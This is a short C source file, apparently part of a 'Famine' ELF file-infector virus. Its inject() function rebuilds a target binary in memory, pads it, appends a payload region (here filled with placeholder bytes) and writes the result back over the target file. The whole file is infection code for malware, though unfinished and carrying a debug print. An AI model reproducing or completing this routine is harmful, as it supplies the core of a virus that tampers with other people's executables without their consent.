#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void write_on_memory(const struct elf *file, char *ptr)
{
	size_t index = 0;
	char *dst = ptr;
	char *src = file->ptr;
	
	while (index < file->data->p_offset + file->data->p_filesz)
	{
		printf("%x\n", *src);
		*dst++ = *src++;
		index++;
	}
	while (index < file->data->p_offset + file->data->p_filesz + file->offs_padding)
	{
		*dst++ = 0;
		index++;
	}
	while (index < file->note->p_offset + PAYLOAD_SIZE)
	{
		*dst++ = 42;
		index++;
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void inject(const struct elf *file)
{
	char *ptr;
	
	if ((ptr = _mmap(NULL, file->note->p_offset + PAYLOAD_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
	{
		ERR("NULL");
		return ;
	}

	write_on_memory(file, ptr);
	if (_write(file->fd, ptr, file->note->p_offset + PAYLOAD_SIZE) < 0)
	{
		ERR("WRITE");
		return ;
	}

	_munmap(ptr, file->note->p_offset + PAYLOAD_SIZE);
}
